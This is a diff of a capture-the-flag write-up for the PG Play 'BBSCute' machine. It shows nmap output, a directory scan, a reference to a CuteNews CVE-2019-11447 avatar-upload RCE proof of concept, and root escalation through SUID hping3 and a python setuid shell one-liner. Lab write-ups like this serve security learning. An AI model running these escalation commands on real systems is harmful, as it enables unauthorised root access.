@@ -1,13 +1,15 @@
 ---
 render_with_liquid: false
-title: PG Play  BBSCute
+title: PG Play - BBSCute
 date: 2024-06-11 14:01:36 +1400
 tags: [pg-play, nmap, linux, feroxbuster, php, cutenews, cve-2019-11447, file-upload, suid, gtfobin]
 ---
 
 
 
-# Learnt / Summary
+The target is compromised via Remote Code Execution (RCE) in CuteNews v2.1.2 through a vulnerable avatar upload feature. Privilege escalation is achieved by abusing SUID permissions on /usr/sbin/hping3, enabling root-level command execution.
+
+# Learnt
 
 - 
 
@@ -17,7 +19,6 @@ tags: [pg-play, nmap, linux, feroxbuster, php, cutenews, cve-2019-11447, file-up
 ## Nmap
 
 ```bash
-
 # Nmap 7.94SVN scan initiated Tue Jun 11 14:01:36 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80,88,110,995, 192.168.239.128
 Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
 Nmap scan report for 192.168.239.128
@@ -130,7 +131,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Tue Jun 11 14:02:07 2024 -- 1 IP address (1 host up) scanned in 31.14 seconds
 ```
 
@@ -206,6 +206,7 @@ feroxbuster -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt --dont-scan "/server-s
 > POC - https://github.com/ColdFusionX/CVE-2019-11447_CuteNews-AvatarUploadRCE
 
 > **Brief exploit info**
+> 
 > - `CuteNews 2.1.2` allows php file upload of user avatar
 > - The exploit POC will auto register a user if provided credential is not calid
 {: .prompt-info }
@@ -299,10 +300,8 @@ www-data@cute:/var/www/html/uploads$ find / -type f -perm -4000 -exec ls -lahtr 
 ```bash
 www-data@cute:/var/www/html/uploads$ hping3
 hping3> /bin/sh -p
-
 # id
 uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
-
 # $(which python2 python python3 2>/dev/null | head -n1) -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
 root@cute:/var/www/html/uploads# id
 uid=0(root) gid=33(www-data) groups=33(www-data)
